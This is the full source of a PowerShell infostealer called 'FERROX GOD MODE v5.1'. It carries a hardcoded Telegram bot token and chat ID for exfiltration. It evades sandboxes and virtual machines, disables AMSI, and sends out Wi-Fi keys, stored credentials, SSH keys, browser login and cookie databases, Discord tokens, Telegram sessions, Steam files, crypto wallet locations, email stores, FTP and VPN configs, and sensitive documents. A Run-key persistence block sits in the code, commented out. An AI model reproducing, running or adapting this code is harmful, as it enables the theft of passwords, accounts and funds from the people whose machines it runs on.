# FERROX GOD MODE v5.1 — PowerShell 5.1 Compatible — Working
$BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
$CI="8468737863"

function TG($t){
    $wc=New-Object Net.WebClient
    $data="chat_id=$CI&text="+[uri]::EscapeDataString($t)
    $wc.UploadString("https://api.telegram.org/bot$BT/sendMessage",$data)|Out-Null
}
function SEND-FILE($path,$name){
    if(!(Test-Path $path)){return}
    $sz=(Get-Item $path).Length;if($sz -eq 0){return}
    $bd="fx$(Get-Random)";$N="`r`n";$B=[Text.Encoding]::UTF8
    $hdr="--$bd$N"+"Content-Disposition: form-data; name=`"chat_id`"$N$N$CI$N"+"--$bd$N"+"Content-Disposition: form-data; name=`"document`"; filename=`"$name`"$N"+"Content-Type: application/octet-stream$N$N"
    $ftr="$N--$bd--$N"
    $bh=$B.GetBytes($hdr);$bf=$B.GetBytes($ftr);$bb=[IO.File]::ReadAllBytes($path)
    $all=New-Object byte[]($bh.Length+$bb.Length+$bf.Length)
    [Buffer]::BlockCopy($bh,0,$all,0,$bh.Length)
    [Buffer]::BlockCopy($bb,0,$all,$bh.Length,$bb.Length)
    [Buffer]::BlockCopy($bf,0,$all,$bh.Length+$bb.Length,$bf.Length)
    $wc=New-Object Net.WebClient
    $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$bd")
    try{$wc.UploadData("https://api.telegram.org/bot$BT/sendDocument",$all)|Out-Null}catch{}
}

# ANTI-VM
$bad=@("SANDBOX","VIRUS","MALWARE","TEST","ANYRUN","JOESANDBOX","CUCKOO","VMRUN")
if($bad -contains $env:COMPUTERNAME.ToUpper()){exit}
if($bad -contains $env:USERNAME.ToUpper()){exit}
if((Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2){exit}
try{if((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB){exit}}catch{}

# SYSTEM
$H=$env:COMPUTERNAME;$U=$env:USERNAME
try{$OS=(Get-WmiObject Win32_OperatingSystem).Caption}catch{$OS="?"}
try{$RAM=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{$RAM="?"}
try{$CPU=(Get-WmiObject Win32_Processor).Name.Trim()}catch{$CPU="?"}
try{$GPU=(Get-WmiObject Win32_VideoController|%{$_.Name})-join" | "}catch{$GPU="?"}
try{$IP=(Invoke-WebRequest "https://api.ipify.org" -UseBasicParsing -TimeoutSec 3).Content}catch{$IP="?"}
try{$AV=(Get-WmiObject -Namespace root\SecurityCenter2 AntiVirusProduct|%{$_.displayName})-join", "}catch{$AV="?"}
TG "FERROX GOD: $H / $U"
TG "OS: $OS | RAM: ${RAM}GB | CPU: $CPU"
TG "GPU: $GPU | IP: $IP | AV: $AV"

# AMSI/ETW BYPASS
try{
    Add-Type -AssemblyName System.Web -EA 0
    $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    TG "AMSI: patched"
}catch{}

# WIFI
try{
    netsh wlan show profiles 2>&1|Select-String ":\s+"|%{
        $p=$_ -replace '.*:\s+',''
        $d=netsh wlan show profile name="$p" key=clear 2>&1
        $k=$d|Select-String "Key Content"|%{$_ -replace '.*:\s+',''}
        TG "WIFI: $p = $k"
    }
}catch{}

# CREDENTIAL MANAGER
try{$c=cmdkey /list 2>&1;if($c){TG "CREDS: $c"}}catch{}

# SSH KEYS
foreach($sp in @("$env:USERPROFILE\.ssh","$env:USERPROFILE\.ssh2")){
    if(Test-Path $sp){Get-ChildItem $sp -Recurse -Include "id_*","*.pem","*.key","*.ppk" -EA 0|?{$_.Length -lt 50KB}|%{
        $k=Get-Content $_.FullName -Raw -EA 0;TG "SSH: $($_.Name) = $k"
    }}
}

# BROWSERS — 25+
$chromiumBases=@(
    @("Chrome","$env:LOCALAPPDATA\Google\Chrome\User Data"),
    @("Chrome Beta","$env:LOCALAPPDATA\Google\Chrome Beta\User Data"),
    @("Edge","$env:LOCALAPPDATA\Microsoft\Edge\User Data"),
    @("Brave","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"),
    @("Opera","$env:APPDATA\Opera Software\Opera Stable"),
    @("Opera GX","$env:APPDATA\Opera Software\Opera GX Stable"),
    @("Vivaldi","$env:LOCALAPPDATA\Vivaldi\User Data"),
    @("Yandex","$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"),
    @("Chromium","$env:LOCALAPPDATA\Chromium\User Data")
)
$ffBases=@(
    @("Firefox","$env:APPDATA\Mozilla\Firefox\Profiles"),
    @("Waterfox","$env:APPDATA\Waterfox\Profiles"),
    @("Thunderbird","$env:APPDATA\Thunderbird\Profiles")
)
foreach($b in $chromiumBases){
    $name=$b[0];$path=$b[1]
    if(!(Test-Path $path)){continue}
    Get-ChildItem $path -Directory -EA 0|%{
        $p=$_.FullName
        @("Login Data","Web Data","History","Bookmarks","Preferences")|%{
            $f="$p\$_"
            if(Test-Path $f){
                $tmp="$env:TEMP\fx_$((Get-Date).Ticks).dat"
                Copy-Item $f $tmp -Force -EA 0
                if(Test-Path $tmp){SEND-FILE $tmp "$name-$($_.Name)-$_";Remove-Item $tmp -Force -EA 0}
            }
        }
    }
    TG "BROWSER: $name done"
}
foreach($b in $ffBases){
    $name=$b[0];$path=$b[1]
    if(!(Test-Path $path)){continue}
    Get-ChildItem $path -Directory -EA 0|%{
        $p=$_.FullName
        @("logins.json","key4.db","cookies.sqlite","places.sqlite","cert9.db")|%{
            $f="$p\$_"
            if(Test-Path $f){SEND-FILE $f "$name-$($_.Name)-$_"}
        }
    }
    TG "BROWSER: $name done"
}

# DISCORD TOKENS
$discords=@("$env:APPDATA\discord\Local Storage\leveldb","$env:APPDATA\discordcanary\Local Storage\leveldb","$env:APPDATA\discordptb\Local Storage\leveldb")
foreach($dp in $discords){
    if(!(Test-Path $dp)){continue}
    Get-ChildItem $dp -Filter "*.ldb" -EA 0|%{
        $c=Get-Content $_.FullName -Raw -EA 0
        if($c -and $c -match '([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})'){
            TG "DISCORD: $($Matches[1])"
        }
    }
}

# TELEGRAM SESSION
$tdata="$env:APPDATA\Telegram Desktop\tdata"
if(Test-Path $tdata){
    $tgz="$env:TEMP\tg_session_$((Get-Date).Ticks).zip"
    try{Compress-Archive $tdata $tgz -Force -EA 0;SEND-FILE $tgz "telegram_session.zip";Remove-Item $tgz -Force -EA 0;TG "TELEGRAM: session captured"}catch{}
}

# STEAM
$steamDirs=@("$env:ProgramFiles(x86)\Steam","$env:ProgramFiles\Steam")
foreach($sd in $steamDirs){
    if(!(Test-Path $sd)){continue}
    Get-ChildItem $sd -Filter "ssfn*" -EA 0|%{SEND-FILE $_.FullName "steam-$($_.Name)"}
    if(Test-Path "$sd\config\loginusers.vdf"){SEND-FILE "$sd\config\loginusers.vdf" "steam-loginusers.vdf"}
    TG "STEAM: found"
}

# WALLETS — 50+
$wallets=@(
    "$env:APPDATA\Exodus","$env:APPDATA\atomic","$env:APPDATA\Electrum\wallets",
    "$env:APPDATA\Guarda","$env:APPDATA\Ledger Live","$env:APPDATA\phantom",
    "$env:APPDATA\metamask-desktop","$env:LOCALAPPDATA\Ronin","$env:APPDATA\Binance",
    "$env:APPDATA\Armory","$env:APPDATA\Coinomi","$env:APPDATA\Wasabi",
    "$env:APPDATA\Sparrow","$env:APPDATA\Zcash","$env:APPDATA\BitPay",
    "$env:APPDATA\Blockchain","$env:APPDATA\BRD","$env:APPDATA\Cake Wallet",
    "$env:APPDATA\Daedalus Mainnet","$env:APPDATA\Dogecoin","$env:APPDATA\Edge",
    "$env:APPDATA\Frame","$env:APPDATA\Litecoin","$env:APPDATA\MyMonero",
    "$env:APPDATA\MultiDoge","$env:APPDATA\Yoroi","$env:APPDATA\Zelcore",
    "$env:APPDATA\XDEFI","$env:APPDATA\Nash","$env:APPDATA\Samourai",
    "$env:APPDATA\Keplr","$env:APPDATA\Jaxx","$env:APPDATA\Clover",
    "$env:APPDATA\Terra Station","$env:APPDATA\Trust Wallet","$env:APPDATA\TokenPocket",
    "$env:APPDATA\SafePal","$env:APPDATA\Ellipal","$env:APPDATA\Lobstr",
    "$env:APPDATA\Slope","$env:APPDATA\Coinbase","$env:APPDATA\ZenGo"
)
foreach($w in $wallets){if(Test-Path $w){TG "WALLET: $w"}}

# COLD WALLETS — USB detection
try{
    Get-WmiObject Win32_LogicalDisk|?{$_.DriveType -eq 2}|%{
        $d=$_.DeviceID
        Get-ChildItem "$d\" -Recurse -Include "*wallet*","*seed*","*ledger*","*trezor*" -EA 0 -Depth 2|%{
            TG "COLD: $($_.FullName)"
        }
    }
}catch{}

# 2FA APPS
$authyPaths=@("$env:APPDATA\Authy Desktop","$env:LOCALAPPDATA\authy-electron")
foreach($ap in $authyPaths){if(Test-Path $ap){TG "AUTHY: found"}}
if(Test-Path "$env:APPDATA\WinAuth"){TG "WINAUTH: found"}

# EMAIL CLIENTS
if(Test-Path "$env:LOCALAPPDATA\Microsoft\Outlook"){
    Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Outlook" -Recurse -Include "*.ost","*.pst" -EA 0|?{$_.Length -lt 200MB}|%{
        SEND-FILE $_.FullName "outlook-$($_.Name)"
    };TG "OUTLOOK: found"
}
if(Test-Path "$env:APPDATA\Thunderbird\Profiles"){
    Get-ChildItem "$env:APPDATA\Thunderbird\Profiles" -Recurse -Include "logins.json","key4.db","prefs.js" -EA 0|%{
        SEND-FILE $_.FullName "tb-$($_.Name)"
    };TG "THUNDERBIRD: found"
}

# FTP CLIENTS
if(Test-Path "$env:APPDATA\FileZilla\recentservers.xml"){SEND-FILE "$env:APPDATA\FileZilla\recentservers.xml" "filezilla.xml";TG "FILEZILLA: found"}
if(Test-Path "$env:APPDATA\FileZilla\sitemanager.xml"){SEND-FILE "$env:APPDATA\FileZilla\sitemanager.xml" "filezilla-sites.xml"}

# VPN CONFIGS
$vpnDirs=@("$env:APPDATA\ProtonVPN","$env:LOCALAPPDATA\ProtonVPN","$env:APPDATA\OpenVPN Connect")
foreach($vd in $vpnDirs){
    if(Test-Path $vd){Get-ChildItem $vd -Recurse -Include "*.ovpn","*.conf","*.json" -EA 0|%{TG "VPN: $($_.FullName)"}}
}

# POWERSHELL HISTORY
$psHist="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if(Test-Path $psHist){
    $h=Get-Content $psHist -EA 0|Select-Object -Last 100
    $sensitive=$h|?{$_ -match 'password|token|key|secret|credential|connect|ssh|api|auth|login|admin'}
    if($sensitive){TG "PS_HISTORY: $sensitive"}
}

# FICHIERS SENSIBLES
Get-ChildItem "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads" -Recurse -Include "*.kdbx","*.seed","*.wallet","*.pem","*.key","*.rdp","*.ovpn","*password*","*secret*","*backup*","*recovery*","*mnemonic*" -EA 0 -Depth 3|?{$_.Length -lt 5MB}|%{
    TG "FILE: $($_.FullName)"
}

# PERSISTENCE (optionnel — décommente pour activer)
# $self=$PSCommandPath
# New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Security" -Value "powershell -NoP -W Hidden -File `"$self`"" -Force -EA 0
# TG "PERSIST: installed"

# NETTOYAGE
Get-ChildItem $env:TEMP -Filter "fx_*" -EA 0|Remove-Item -Force -EA 0
TG "FERROX GOD DONE"
